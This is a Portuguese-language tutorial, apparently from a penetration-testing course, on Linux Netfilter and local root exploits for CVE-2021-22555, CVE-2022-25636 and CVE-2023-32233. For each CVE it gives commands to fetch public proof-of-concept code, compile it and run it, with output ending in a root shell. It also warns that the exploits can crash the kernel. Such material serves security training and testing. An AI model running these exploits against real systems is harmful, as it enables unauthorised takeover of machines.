**Netfilter** é um módulo do kernel Linux que fornece funcionalidades para filtragem de pacotes, tradução de endereços de rede e outras ferramentas de firewall. Ele controla o tráfego de rede manipulando pacotes com base em regras definidas.

Também é conhecido como uma camada de software no kernel Linux, e atua ao interceptar e manipular pacotes de rede, com o auxílio de módulos como `iptables` e `arptables`, que funcionam como mecanismos de ação no sistema de gancho da pilha de protocolos IPv4 e IPv6.

Este módulo do kernel tem três funções principais:

1. Desfragmentação de pacotes
2. Rastreamento de conexão
3. Tradução de endereços de rede (NAT)

Quando o módulo é ativado, todos os pacotes IP são verificados pelo `Netfilter`antes de serem encaminhados para o aplicativo de destino do próprio sistema ou remoto.

Em 2021 ( [CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555) ), 2022 ( [CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015) ), e também em 2023 ( [CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233) ), várias vulnerabilidades foram encontradas que podem levar à escalada de privilégios.

Muitas empresas utilizam distribuições Linux pré-configuradas adaptadas aos seus aplicativos, criando uma "base dinâmica" difícil de substituir.

Adaptar o sistema ao aplicativo ou vice-versa pode ser demorado e trabalhoso, levando muitas empresas a manter distribuições Linux mais antigas em produção. Mesmo com o uso de máquinas virtuais ou contêineres como Docker, que isolam o aplicativo do sistema host, há formas de contornar essa isolação, já que os contêineres são construídos sobre um kernel específico.

#### CVE-2021-22555
Versões vulneráveis ​​do kernel: 2.6 - 5.11

```shell-session
cry0l1t3@ubuntu:~$ uname -r

5.10.5-051005-generic
```

```shell-session
cry0l1t3@ubuntu:~$ wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
cry0l1t3@ubuntu:~$ gcc -m32 -static exploit.c -o exploit
cry0l1t3@ubuntu:~$ ./exploit

[+] Linux Privilege Escalation by theflow@ - 2021

[+] STAGE 0: Initialization
[*] Setting up namespace sandbox...
[*] Initializing sockets and message queues...

[+] STAGE 1: Memory corruption
[*] Spraying primary messages...
[*] Spraying secondary messages...
[*] Creating holes in primary messages...
[*] Triggering out-of-bounds write...
[*] Searching for corrupted primary message...
[+] fake_idx: fff
[+] real_idx: fdf

...SNIP...

root@ubuntu:/home/cry0l1t3# id

uid=0(root) gid=0(root) groups=0(root)
```

#### CVE-2022-25636

Uma vulnerabilidade recente é [CVE-2022-25636](https://www.cvedetails.com/cve/CVE-2022-25636/) e afeta o kernel Linux 5.4 a 5.6.10. Isso é `net/netfilter/nf_dup_netdev.c`, que pode conceder privilégios de root a usuários locais devido à gravação fora dos limites do heap. `Nick Gregory` escreveu um [artigo](https://nickgregory.me/post/2022/03/12/cve-2022-25636/) muito detalhado sobre como ele descobriu essa vulnerabilidade.[](https://nickgregory.me/post/2022/03/12/cve-2022-25636/)

```shell-session
cry0l1t3@ubuntu:~$ uname -r

5.13.0-051300-generic
```

No entanto, precisamos ter cuidado com esse exploit, pois ele pode corromper o kernel e será necessária uma reinicialização para acessar novamente o servidor.

```shell-session
cry0l1t3@ubuntu:~$ git clone https://github.com/Bonfee/CVE-2022-25636.git
cry0l1t3@ubuntu:~$ cd CVE-2022-25636
cry0l1t3@ubuntu:~$ make
cry0l1t3@ubuntu:~$ ./exploit

[*] STEP 1: Leak child and parent net_device
[+] parent net_device ptr: 0xffff991285dc0000
[+] child  net_device ptr: 0xffff99128e5a9000

[*] STEP 2: Spray kmalloc-192, overwrite msg_msg.security ptr and free net_device
[+] net_device struct freed

[*] STEP 3: Spray kmalloc-4k using setxattr + FUSE to realloc net_device
[+] obtained net_device struct

[*] STEP 4: Leak kaslr
[*] kaslr leak: 0xffffffff823093c0
[*] kaslr base: 0xffffffff80ffefa0

[*] STEP 5: Release setxattrs, free net_device, and realloc it again
[+] obtained net_device struct

[*] STEP 6: rop :)

# id

uid=0(root) gid=0(root) groups=0(root)
```

#### CVE-2023-32233
Esta vulnerabilidade explora o chamado `anonymous sets`in `nf_tables`usando a `Use-After-Free`vulnerabilidade no Kernel Linux até a versão `6.3.1`.

Estes `nf_tables`são espaços de trabalho temporários para processar solicitações em lote e, uma vez que o processamento é feito, esses conjuntos anônimos devem ser limpos ( `Use-After-Free`) para que não possam mais ser usados. Devido a um erro no código, esses conjuntos anônimos não estão sendo manipulados corretamente e ainda podem ser acessados ​​e modificados pelo programa.

A exploração é feita manipulando o sistema para usar os conjuntos anônimos `cleared out` para interagir com a memória do kernel. Ao fazer isso, podemos potencialmente ganhar `root` privilégios.

#### Prova de conceito
```shell-session
cry0l1t3@ubuntu:~$ git clone https://github.com/Liuk3r/CVE-2023-32233
cry0l1t3@ubuntu:~$ cd CVE-2023-32233
cry0l1t3@ubuntu:~/CVE-2023-32233$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```

#### Exploração
```shell-session
cry0l1t3@ubuntu:~/CVE-2023-32233$ ./exploit

[*] Netfilter UAF exploit

Using profile:
========
1                   race_set_slab                   # {0,1}
1572                race_set_elem_count             # k
4000                initial_sleep                   # ms
100                 race_lead_sleep                 # ms
600                 race_lag_sleep                  # ms
100                 reuse_sleep                     # ms
39d240              free_percpu                     # hex
2a8b900             modprobe_path                   # hex
23700               nft_counter_destroy             # hex
347a0               nft_counter_ops                 # hex
a                   nft_counter_destroy_call_offset # hex
ffffffff            nft_counter_destroy_call_mask   # hex
e8e58948            nft_counter_destroy_call_check  # hex
========

[*] Checking for available CPUs...
[*] sched_getaffinity() => 0 2
[*] Reserved CPU 0 for PWN Worker
[*] Started cpu_spinning_loop() on CPU 1
[*] Started cpu_spinning_loop() on CPU 2
[*] Started cpu_spinning_loop() on CPU 3
[*] Creating "/tmp/modprobe"...
[*] Creating "/tmp/trigger"...
[*] Updating setgroups...
[*] Updating uid_map...
[*] Updating gid_map...
[*] Signaling PWN Worker...
[*] Waiting for PWN Worker...

...SNIP...

[*] You've Got ROOT:-)

# id

uid=0(root) gid=0(root) groups=0(root)
```

Tenha em mente que esses exploits podem ser muito instáveis ​​e podem danificar o sistema.





































